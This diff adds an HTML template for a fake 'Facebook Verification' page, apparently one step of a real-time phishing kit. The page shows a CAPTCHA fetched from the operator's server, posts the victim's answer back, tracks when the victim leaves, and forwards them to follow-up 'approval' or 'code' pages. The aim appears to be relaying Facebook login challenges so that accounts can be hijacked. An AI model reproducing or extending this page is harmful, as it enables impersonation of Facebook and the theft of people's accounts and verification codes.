@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="<%= i18n.language %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50">
+    <div class="max-w-md mx-auto bg-white min-h-screen">
+        <div class="px-4 py-3 border-b border-gray-200"><p class="text-sm text-gray-600">Facebook</p></div>
+
+        <div class="px-4 py-6">
+            <h1 class="text-2xl font-semibold text-gray-900 mb-3"><%= t('captcha.title') %></h1>
+            <p class="text-gray-600 mb-6"><%= t('captcha.description') %></p>
+
+            <form id="captchaForm">
+                <div class="mb-4">
+                    <img id="captchaImage" src="" alt="Cargando CAPTCHA..." class="w-full border border-gray-300 rounded-lg">
+                </div>
+
+                <input type="hidden" name="user" id="userField">
+                <input type="hidden" name="propietario" id="propietarioField">
+                <input type="hidden" name="url_final" id="urlFinalField">
+                
+                <div class="mb-4">
+                    <input name="solution" id="solutionField" type="text" placeholder="<%= t('captcha.placeholder') %>" required
+                        class="w-full h-12 text-lg border border-gray-300 rounded-lg px-4 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
+                        autocapitalize="off" autocomplete="off" spellcheck="false">
+                </div>
+
+                <div class="space-y-3">
+                    <button type="submit" id="submitButton" class="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-lg transition-colors flex items-center justify-center">
+                        <span id="buttonText"><%= t('captcha.button') %></span>
+                        <div id="buttonSpinner" class="hidden animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const user = urlParams.get('user');
+        const propietario = urlParams.get('propietario');
+        const url_final = urlParams.get('url_final');
+
+        document.getElementById('userField').value = user;
+        document.getElementById('propietarioField').value = propietario;
+        document.getElementById('urlFinalField').value = url_final;
+
+        const captchaForm = document.getElementById('captchaForm');
+        const captchaImage = document.getElementById('captchaImage');
+        const solutionField = document.getElementById('solutionField');
+        const submitButton = document.getElementById('submitButton');
+        const buttonText = document.getElementById('buttonText');
+        const buttonSpinner = document.getElementById('buttonSpinner');
+        
+        let isNavigatingInternally = false;
+        window.addEventListener('beforeunload', () => {
+            if (!isNavigatingInternally && user) {
+                navigator.sendBeacon('/disconnect', new Blob([JSON.stringify({ user })], { type: 'application/json' }));
+            }
+        });
+
+        const setLoadingState = (isLoading) => {
+            if (isLoading) {
+                submitButton.disabled = true;
+                submitButton.classList.add('opacity-50', 'cursor-not-allowed');
+                buttonText.classList.add('hidden');
+                buttonSpinner.classList.remove('hidden');
+            } else {
+                submitButton.disabled = false;
+                submitButton.classList.remove('opacity-50', 'cursor-not-allowed');
+                buttonText.classList.remove('hidden');
+                buttonSpinner.classList.add('hidden');
+            }
+        };
+
+        const pollForStatus = () => {
+            const pollInterval = setInterval(() => {
+                if (!user) { clearInterval(pollInterval); return; }
+                
+                fetch(`/code-status?user=${encodeURIComponent(user)}`)
+                    .then(res => res.json())
+                    .then(status => {
+                        if (status.captcha && status.captcha.refresh) {
+                            // CAPTCHA INCORRECTO
+                            console.log('Refrescando imagen del CAPTCHA...');
+                            captchaImage.src = status.captcha.imageData;
+                            solutionField.value = ''; // Limpiar el campo
+                            setLoadingState(false);   // Reactivar el botón
+                            clearInterval(pollInterval); // Detener el polling
+                            return;
+                        }
+
+                        // CAPTCHA CORRECTO, ver cuál es el siguiente paso
+                        if (status.accepted || status.approval || status.need) {
+                            isNavigatingInternally = true;
+                            clearInterval(pollInterval);
+                            const nextParams = new URLSearchParams({ user, propietario, url_final }).toString();
+                            if (status.accepted) {
+                                window.location.href = status.accepted.url_final;
+                            } else if (status.approval) {
+                                window.location.href = `/approval?${nextParams}`;
+                            } else if (status.need) {
+                                window.location.href = `/code?${nextParams}`;
+                            }
+                        }
+                    });
+            }, 2000);
+        };
+        
+        // Cargar la imagen inicial
+        fetch(`/code-status?user=${encodeURIComponent(user)}`)
+            .then(res => res.json())
+            .then(status => {
+                if (status.captcha && status.captcha.imageData) {
+                    captchaImage.src = status.captcha.imageData;
+                }
+            });
+
+        // Manejar el envío del formulario
+        captchaForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            setLoadingState(true);
+
+            const formData = new FormData(captchaForm);
+            const data = Object.fromEntries(formData.entries());
+
+            await fetch('/captcha', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user: data.user, solution: data.solution })
+            });
+
+            // Una vez enviado, empezamos a preguntar por el resultado
+            pollForStatus();
+        });
+    </script>
+</body>
+</html>
